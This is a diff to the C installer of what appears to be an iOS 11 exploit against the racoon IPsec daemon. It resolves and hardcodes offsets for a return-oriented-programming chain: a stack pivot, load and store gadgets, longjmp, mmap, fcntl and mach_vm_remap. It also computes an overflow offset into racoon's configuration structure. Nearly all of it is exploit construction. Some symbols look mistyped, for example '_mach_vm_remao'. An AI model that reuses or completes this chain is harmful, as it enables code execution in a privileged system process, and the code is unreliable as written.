@@ -7,6 +7,7 @@
 #include "stage1.h"
 #include "stage2.h"
 #include "uland_offsetfinder.h"
+#include "../shared/realsym.h"
 
 int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
 {
@@ -19,7 +20,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	// find the address of "No more than %d WINS" and "failed to set my ident %s" then an xref to the error handling code and then an xref which calls that code, for the first one you need to find an adr and for the second one you need an ldr
 	myoffsets.dns4_array_to_lcconf = -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr()); 
 	myoffsets.lcconf_counter_offset = 0x10c; // we could try and find that dynamically or we could just hardcode it cause it prob doesn't change on 11.x (TODO: get that dynamically)
-	myoffsets.memmove = memmove_cache_ptr();  // strlcpy second branch
+	myoffsets.memmove = memmove_cache_ptr(dyld_cache_path);  // strlcpy second branch
 	myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp"); // dlsym
 	myoffsets.stack_pivot = get_stackpivot_addr(dyld_cache_path); // longjmp from mov x2, sp
 	myoffsets.mmap = realsym(dyld_cache_path,"__mmap"); // dlsym of __mmap
@@ -36,10 +37,10 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.str_x0_gadget = 0x199875020; // search for the byte sequence again (gadget in rop.h)
 	myoffsets.str_x0_gadget_offset = 0x28; // based on the gadget above
 	myoffsets.cbz_x0_gadget = get_cbz_x0_gadget(); // search for the byte sequence (gadget in rop.h)
-	myoffsets.cbz_x0_x16_load = cbz_gadget_x16_load(); // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
+	myoffsets.cbz_x0_x16_load = get_cbz_x0_x16_load(myoffsets.cbz_x0_gadget); // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
 	myoffsets.add_x0_gadget = 0x18518bb90; // raw byte search again (gadget is in rop.h)
 	myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"__fcntl"); // raw bytes again (because it's a mov x16, <imm>, svc and that can't change)
-	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache,"_mach_vm_remao");
+	myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remao");
 	myoffsets.rop_nop = 0x180b12728; // just use the longjmp gadget above and search the ret instruction
 	myoffsets.new_cache_addr = 0x1c0000000; 
 	myoffsets.cache_text_seg_size = 0x30000000; // we can get that by parsing the segements from the cache
